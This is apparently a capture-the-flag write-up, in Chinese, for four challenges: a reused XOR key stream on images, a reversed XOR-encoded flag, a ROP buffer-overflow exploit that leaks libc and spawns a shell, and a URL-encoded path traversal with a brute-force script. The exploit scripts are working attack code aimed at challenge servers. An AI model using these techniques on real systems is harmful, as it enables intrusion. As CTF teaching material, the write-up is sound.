# to bf or not to bf

FLAG: `FLAG{Do_not_teLL_Golem_i_use_his_photo}`

注意到它兩個圖片 encrypt 的方法都是 xor 相同的 key stream (因為 seed 一樣)，把兩張圖片 xor 之後就能看到 `flag.png` 和 `golem.png` xor 的結果，然後用肉眼從圖片中讀出 flag 即可。

```python
import cv2

ar1 = cv2.imread("flag_enc.png", cv2.IMREAD_GRAYSCALE)
ar2 = cv2.imread("golem_enc.png", cv2.IMREAD_GRAYSCALE)

h, w = ar1.shape
for i in range(h):
    for j in range(w):
        ar1[i][j] ^= ar2[i][j]


cv2.imwrite("flag.png", ar1)
```

# XAYB

FLAG: `FLAG{W0o_WAW_Y0U_50_LvcKy_watch_v__LBV49TPBEg}`

用 IDA 打開看它的邏輯，可以知道當它在 BINGO 之後會把一個字串和 0xf2 做 xor 之後輸出，而那個字串的來源是在 `main` 函數的一些常數，所以 dump 出來之後把它 xor 即可得到 flag。

```python
data = b"\xb4\xbe\xb3\xb5\x89\xa5\xc2\x9d\xad\xa5\xb3\xa5\xad\xab\xc2\xa7\xad\xc7\xc2\xad\xbe\x84\x91\xb9\x8b\xad\x85\x93\x86\x91\x9a\xad\x84\xad\xad\xbe\xb0\xa4\xc6\xcb\xa6\xa2\xb0\xb7\x95\x8f\x00\x00"
print(bytes(x ^ 0xF2 for x in data))
```

# Arch Check

FLAG: `FLAG{d1d_y0u_ju5t_s4y_w1nd0w5?}`

有個明顯的 buffer overflow 可以控制 return address，不過有 NX 所以只能用 ROP。我的方法是先 `pop rdi` 塞 GOT table 中的 `puts`，然後 return 到 `puts` 上之後再 return 回 main，這樣可以 leak 出 libc 的 address。

> Remote libc 版本是用 https://libc.rip/ 去查的

之後回到 main 之後再 overflow 一次，return 到 libc 中的 one gadget 即可 get shell。

```python
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# context.log_level = 'debug'

libc = ELF("./libc6_2.31-0ubuntu9.3_amd64.so")
elf = ELF("./arch_check_patched")  # patched using patchelf with correct libc and linker
rop = ROP(elf)
# io = process("./arch_check_patched")
io = remote("up.zoolab.org", 30001)

sh = 0x403008
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
chain = flat([pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]])
io.sendlineafter(b"using?\n", b"a" * 40 + chain)
io.recvline()
puts = int.from_bytes(io.recv(6), "little")
libc_base = puts - libc.sym["puts"]
print(f"{libc_base = :#x}")

gadget = libc_base + 0xE6C81
chain = flat([gadget])
io.sendlineafter(b"using?\n", b"a" * 40 + chain)
io.interactive()
```

# text2emoji

FLAG: `FLAG{3asy_p4th_tr4vers4l}`

在 `/source` 裡面可以看到目標要 request 到 internal api server 的 `/api/v1/looksLikeFlag` 才能拿 flag，但是 public server 的 `/public_api` 會檢查提供的 `text` 有沒有空白(類)字元以及 `.` 字元出現，之後把 url 變成 `http://127.0.0.1:7414/api/v1/emoji/${text}`，所以沒辦法簡單的 path traversal。

我這邊是用 `%2e` (url encoded 的 `.`)去繞過的，可以自己在 node.js 測試 `http://localhost/api/%2e%2e/peko` 實際上會發送 request 到 `http://localhost/peko`。所以利用這個方法，`text` 設為 `%2e%2e/looksLikeFlag?flag=FLAG{` 之後就可以開始爆破 flag 了。

因為它寫 flag 符合 `^FLAG{[a-z0-9_]+}$` 的 regex，所以就直接寫個腳本去炸 flag 就好了。

```python
import httpx
import asyncio
import string


async def checkFlag(client, f):
    resp = await client.post(
        "http://splitline.tw:5000/public_api",
        json={"text": "%2e%2e/looksLikeFlag?flag=" + f},
    )
    return resp.json()["looksLikeFlag"]


async def main():
    async with httpx.AsyncClient(http2=True) as client:
        prefix = "FLAG{"
        chs = "_}" + string.ascii_lowercase + string.digits
        while not prefix.endswith("}"):
            results = await asyncio.gather(
                *[checkFlag(client, prefix + c) for c in chs]
            )
            for c, r in zip(chs, results):
                if r:
                    prefix += c
            print(prefix)


asyncio.run(main())
```
